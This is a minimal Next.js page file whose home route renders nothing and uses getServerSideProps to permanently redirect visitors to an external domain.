export default function Home() {
  return null
}

export async function getServerSideProps() {
  return {
    redirect: {
      destination: 'https://q789.com.pk',
      permanent: true,
    },
  }
}
